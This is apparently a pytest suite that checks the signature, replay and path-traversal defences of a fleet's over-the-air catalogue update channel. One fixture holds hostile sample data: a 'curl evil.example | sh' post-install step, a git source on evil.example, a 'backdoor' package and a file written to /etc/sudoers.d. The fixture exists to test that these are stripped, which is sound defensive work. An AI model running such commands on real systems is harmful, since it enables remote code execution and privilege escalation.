"""The catalogue's own update channel, and the signature that gates it.

This channel decides which application every box in the fleet installs and
which one it launches. Unsigned, it is a remote code execution primitive with a
pleasant API: whoever holds the endpoint, the DNS or the TLS terminator holds
the fleet. So the assertions here are not "the happy path works" — they are the
list of things that must be REFUSED, and each one is a way somebody gets in.

    no signature            an attacker who can serve bytes
    wrong key               an attacker with their own keypair
    tampered payload        an attacker on the wire
    replayed old bundle     an attacker who kept yesterday's valid bundle
    privileged blocks       an attacker who got a bundle signed
    a pack id with a slash  an attacker writing outside the OTA tree

The signing key used below is generated per test run, in the test's own tmp
directory, and never written into the repository. There is no committed key,
"dev-only" or otherwise: a test key in git is a real key the moment somebody
points a box at a test endpoint.
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from backend.services.catalog import ota, signing                   # noqa: E402
from backend.services.catalog.signing import SignatureError         # noqa: E402

# A hard import, deliberately NOT `pytest.importorskip`. cryptography is a
# pinned requirement, and skipping is the wrong failure: this file is the only
# thing standing between the fleet and an unauthenticated remote catalogue, and
# a green run with the whole module quietly skipped reads exactly like a green
# run with it passing. If the dependency is missing, that is the finding.
from cryptography.hazmat.primitives import serialization            # noqa: E402
from cryptography.hazmat.primitives.asymmetric import ed25519       # noqa: E402


def _keypair(tmp_path, name="catalog-signing"):
    """A throwaway keypair. Returns (private key object, public key path)."""
    private = ed25519.Ed25519PrivateKey.generate()
    raw_pub = private.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw)
    pub_path = tmp_path / f"{name}.pub"
    pub_path.write_text(base64.b64encode(raw_pub).decode() + "\n")
    return private, pub_path


def _pack(pack_id="probe", app_ids=("org.example.One",), **extra):
    data = {
        "id": pack_id, "kind": "app", "label": "Probe", "platform": "probe",
        "color": "#000000",
        "install": {"provider": "flatpak", "appIds": list(app_ids)},
        "launch": {"path": "flatpak", "args": "run @APPID@"},
    }
    data.update(extra)
    return data


def _bundle(private, version=2, packs=None):
    payload = json.dumps({"version": version,
                          "packs": packs if packs is not None else {"probe": _pack()}},
                         sort_keys=True).encode()
    return json.dumps({"payload": base64.b64encode(payload).decode(),
                       "sig": base64.b64encode(private.sign(payload)).decode()}).encode()


# ── the happy path, so the refusals below mean something ───────────────────

def test_a_correctly_signed_newer_catalogue_is_applied(tmp_path):
    private, pub = _keypair(tmp_path)
    state = tmp_path / "state"

    summary = ota.apply_bundle(_bundle(private, version=2), public_key=pub,
                               state=state, current=1)

    assert summary["version"] == 2 and summary["packs"] == ["probe"]
    written = json.loads((state / "probe" / "pack.json").read_text())
    assert written["install"]["appIds"] == ["org.example.One"]
    assert json.loads((state / "applied.json").read_text())["version"] == 2


# ── what must be refused ───────────────────────────────────────────────────

def test_an_unsigned_catalogue_is_refused(tmp_path):
    """The plain payload with no envelope — what a naive endpoint would serve,
    and what a "we'll add signing later" implementation would accept."""
    _, pub = _keypair(tmp_path)
    naked = json.dumps({"version": 2, "packs": {"probe": _pack()}}).encode()

    with pytest.raises(SignatureError) as e:
        ota.apply_bundle(naked, public_key=pub, state=tmp_path / "s", current=1)
    assert "sig" in str(e.value)
    assert not (tmp_path / "s").exists(), "a refused bundle wrote to disk"


def test_a_catalogue_signed_by_the_wrong_key_is_refused(tmp_path):
    """An attacker with their own keypair. The maths is the whole defence: a
    box trusts exactly the public key its release shipped."""
    attacker, _ = _keypair(tmp_path, "attacker")
    _, pub = _keypair(tmp_path)

    with pytest.raises(SignatureError) as e:
        ota.apply_bundle(_bundle(attacker), public_key=pub,
                         state=tmp_path / "s", current=1)
    assert "signature does not match" in str(e.value)


def test_a_tampered_payload_is_refused(tmp_path):
    """An attacker on the wire flipping one app id — the exact thing this
    channel would otherwise hand them, since the catalogue names what to
    install and what to run."""
    private, pub = _keypair(tmp_path)
    envelope = json.loads(_bundle(private))
    payload = json.loads(base64.b64decode(envelope["payload"]))
    payload["packs"]["probe"]["install"]["appIds"] = ["org.attacker.Payload"]
    envelope["payload"] = base64.b64encode(
        json.dumps(payload, sort_keys=True).encode()).decode()

    with pytest.raises(SignatureError):
        ota.apply_bundle(json.dumps(envelope).encode(), public_key=pub,
                         state=tmp_path / "s", current=1)


def test_a_replayed_older_catalogue_is_refused(tmp_path):
    """The attack a signature cannot express. Yesterday's bundle is validly
    signed for ever; serving it again is how somebody puts back the dead app id
    that today's bundle fixes. Only the version comparison stops it."""
    private, pub = _keypair(tmp_path)
    state = tmp_path / "state"
    ota.apply_bundle(_bundle(private, version=5), public_key=pub, state=state,
                     current=0)

    with pytest.raises(ValueError) as e:
        ota.apply_bundle(_bundle(private, version=4), public_key=pub, state=state)
    assert "not newer" in str(e.value)
    assert ota.applied_version(state) == 5, "the replay moved the box backwards"


def test_the_same_version_twice_is_refused(tmp_path):
    """Strictly newer, not newer-or-equal: re-signing different content under
    the same number is how a rollback wears a fresh version's clothes."""
    private, pub = _keypair(tmp_path)
    state = tmp_path / "state"
    ota.apply_bundle(_bundle(private, version=7), public_key=pub, state=state,
                     current=0)
    with pytest.raises(ValueError):
        ota.apply_bundle(_bundle(private, version=7), public_key=pub, state=state)


def test_a_missing_public_key_refuses_rather_than_skipping_the_check(tmp_path):
    """The failure mode that would quietly turn the whole thing off. No key
    must mean "refuse everything", never "nothing to check against"."""
    private, _ = _keypair(tmp_path)
    with pytest.raises(SignatureError):
        ota.apply_bundle(_bundle(private), public_key=tmp_path / "absent.pub",
                         state=tmp_path / "s", current=1)


# ── what a signed catalogue is still not allowed to do ─────────────────────

def test_the_code_executing_blocks_are_dropped_even_when_signed(tmp_path):
    """Defence in depth, and the reason the channel is safe to automate.

    A signature proves who sent the bundle, not that they were careful. The
    remote tier is data only with no opt-in — unlike config/catalog.d/, where
    GAMECORE_TRUST_LOCAL_PACKS exists because the operator can say "I put that
    directory there myself". Nobody can say that about bytes off the network.
    """
    private, pub = _keypair(tmp_path)
    hostile = _pack(postInstall=[{"run": "curl evil.example | sh"}],
                    services=[{"unit": "x.service", "scope": "user"}],
                    packages={"pacman": ["backdoor"]},
                    sources=[{"git": "https://evil.example/x", "dest": "lib/x"}],
                    files=[{"src": "a", "dest": "/etc/sudoers.d/x"}])
    state = tmp_path / "state"

    summary = ota.apply_bundle(_bundle(private, packs={"probe": hostile}),
                               public_key=pub, state=state, current=1)

    written = json.loads((state / "probe" / "pack.json").read_text())
    for block in ("postInstall", "services", "packages", "sources", "files"):
        assert block not in written, f"a signed bundle got {block} onto the box"
    assert set(summary["droppedBlocks"]["probe"]) >= {
        "postInstall", "services", "packages", "sources", "files"}
    assert written["install"]["appIds"] == ["org.example.One"], \
        "the part the channel exists for was lost along with the dangerous parts"


@pytest.mark.parametrize("pack_id", [
    "../escape", "a/b", "/etc", "..", ".hidden", "", "UPPER",
])
def test_a_pack_id_that_is_not_a_directory_name_is_refused(tmp_path, pack_id):
    """The id becomes a directory under the OTA tier. A slash or a `..` in it
    writes outside that tree — on a box where the backend can reach the config
    the installers read."""
    private, pub = _keypair(tmp_path)
    state = tmp_path / "state"

    with pytest.raises(ValueError):
        ota.apply_bundle(_bundle(private, packs={pack_id: _pack(pack_id)}),
                         public_key=pub, state=state, current=1)
    assert not (tmp_path / "escape").exists()
    assert not (state / ".." / "escape").exists()


def test_a_bundle_with_no_version_is_refused(tmp_path):
    """Unversioned means unorderable, and unorderable means the replay check
    above has nothing to compare."""
    private, pub = _keypair(tmp_path)
    with pytest.raises(ValueError):
        ota.apply_bundle(_bundle(private, version=0), public_key=pub,
                         state=tmp_path / "s", current=0)


# ── the loader's third tier ────────────────────────────────────────────────

def test_the_remote_tier_overrides_shipped_and_yields_to_local(tmp_path):
    """Order is the whole design. A remote catalogue corrects the release; the
    operator overrules both, or the channel is also a way to overrule the
    person holding the machine.
    """
    from backend.services.catalog import load_catalog

    shipped, remote, local = (tmp_path / n for n in ("shipped", "remote", "local"))
    (shipped / "_schema").mkdir(parents=True)
    (shipped / "_schema" / "pack.schema.json").write_text(
        (ROOT / "catalog" / "_schema" / "pack.schema.json").read_text())

    def write(base, app_id):
        d = base / "probe"
        d.mkdir(parents=True)
        (d / "pack.json").write_text(json.dumps(_pack(app_ids=[app_id])))
        (d / "logo.png").write_bytes(b"\x89PNG")

    write(shipped, "org.example.Shipped")
    assert load_catalog(shipped, local, remote)["probe"].app_ids == \
        ["org.example.Shipped"]

    write(remote, "org.example.Remote")
    pack = load_catalog(shipped, local, remote)["probe"]
    assert pack.app_ids == ["org.example.Remote"] and pack.origin == "remote"

    write(local, "org.example.Local")
    pack = load_catalog(shipped, local, remote)["probe"]
    assert pack.app_ids == ["org.example.Local"] and pack.origin == "local"


def test_a_remote_pack_never_contributes_a_generator(tmp_path):
    """`generator.py` is executed against the emulator's config. A remote pack
    may not supply one, and — unlike a local pack — there is no environment
    variable that says otherwise."""
    from backend.services.catalog import load_catalog

    shipped, remote = tmp_path / "shipped", tmp_path / "remote"
    (shipped / "_schema").mkdir(parents=True)
    (shipped / "_schema" / "pack.schema.json").write_text(
        (ROOT / "catalog" / "_schema" / "pack.schema.json").read_text())
    d = remote / "probe"
    d.mkdir(parents=True)
    (d / "pack.json").write_text(json.dumps(_pack()))
    (d / "logo.png").write_bytes(b"\x89PNG")
    (d / "generator.py").write_text("raise SystemExit('executed')")

    pack = load_catalog(shipped, tmp_path / "none", remote)["probe"]
    assert pack.generator is None
    assert "generator.py" in pack.stripped


def test_trusting_local_packs_does_not_trust_remote_ones(tmp_path, monkeypatch):
    """The opt-in is scoped to what the operator put there themselves. If it
    leaked to the remote tier, one environment variable would turn an endpoint
    into arbitrary code execution."""
    from backend.services.catalog import load_catalog

    monkeypatch.setenv("GAMECORE_TRUST_LOCAL_PACKS", "1")
    shipped, remote = tmp_path / "shipped", tmp_path / "remote"
    (shipped / "_schema").mkdir(parents=True)
    (shipped / "_schema" / "pack.schema.json").write_text(
        (ROOT / "catalog" / "_schema" / "pack.schema.json").read_text())
    d = remote / "probe"
    d.mkdir(parents=True)
    (d / "pack.json").write_text(json.dumps(_pack()))
    (d / "logo.png").write_bytes(b"\x89PNG")
    (d / "generator.py").write_text("raise SystemExit('executed')")

    assert load_catalog(shipped, tmp_path / "none", remote)["probe"].generator is None


# ── the release ships a version, and the tool refuses to leak a key ────────

def test_the_shipped_catalogue_declares_a_version():
    """Without it every box would accept version 1 for ever and the replay
    check would have nothing to stand on."""
    assert ota.shipped_version(ROOT / "catalog") >= 1


def test_no_private_key_is_committed():
    """The one mistake that cannot be undone by a later commit: a key in git
    history is a published key. Names, and content — a base64 line that decodes
    to exactly 32 bytes next to the public one is what a leaked key looks like.
    """
    import subprocess
    tracked = subprocess.run(["git", "ls-files"], cwd=ROOT, capture_output=True,
                             text=True, timeout=60).stdout.split()
    suspicious = [f for f in tracked
                  if any(s in f.lower() for s in (".key", ".priv", "private", "secret"))
                  and "signing" in f.lower() or f.endswith(".ed25519")]
    assert suspicious == [], f"a signing key may be committed: {suspicious}"

    ota_dir = ROOT / "catalog" / "_ota"
    if ota_dir.is_dir():
        for f in ota_dir.iterdir():
            assert f.name == signing.PUBLIC_KEY_NAME or f.name.endswith((".md", ".pub")), \
                f"catalog/_ota/ holds {f.name} — only the PUBLIC key belongs here"
